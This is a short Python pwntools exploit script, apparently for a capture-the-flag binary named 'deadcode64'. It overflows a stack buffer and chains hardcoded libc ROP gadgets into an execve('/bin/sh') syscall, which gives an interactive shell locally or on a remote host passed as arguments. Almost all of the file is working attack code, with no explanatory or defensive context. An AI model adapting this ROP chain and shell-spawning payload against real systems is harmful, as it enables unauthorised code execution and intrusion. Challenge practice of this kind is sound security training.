#!/usr/bin/env python3

import time, os, traceback, sys, os
import pwn
import binascii, array
from textwrap import wrap

def start(argv=[], *a, **kw):
    if pwn.args.GDB: # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath], gdbscript=gdbscript, aslr=False)
    elif pwn.args.REMOTE: # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # run locally, no GDB
        return pwn.process([binPath])


binPath="./deadcode64"
isRemote = pwn.args.REMOTE

# build in GDB support
gdbscript = '''
init-pwndbg
break *getData+39
continue
'''.format(**locals())

# interact with the program to get to where we can exploit
pwn.context.log_level="info"
io = start()

elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)

# define payload
overFlow = b'A'*16

popRDI = pwn.p64(0x000000000040121b)
binSH = pwn.p64(0x7ffff7f6c882)

libCBase = 0x00007ffff7dd4000
popRAX = pwn.p64(0x000000000003f928 + libCBase)
popRSI = pwn.p64(0x000000000002940f + libCBase)
popRDX = pwn.p64(0x00000000000caa2d + libCBase)
syscall = pwn.p64(0x0000000000058dba + libCBase)

payload = pwn.flat(
        [
            overFlow,
            popRAX,
            0x3b,
            popRDI,
            binSH,
            popRSI,
            0x0,
            popRDX,
            0x0,
            syscall
           ]
        )
pwn.info("Payload length: %d",len(payload))

io.sendline(payload)
io.interactive()

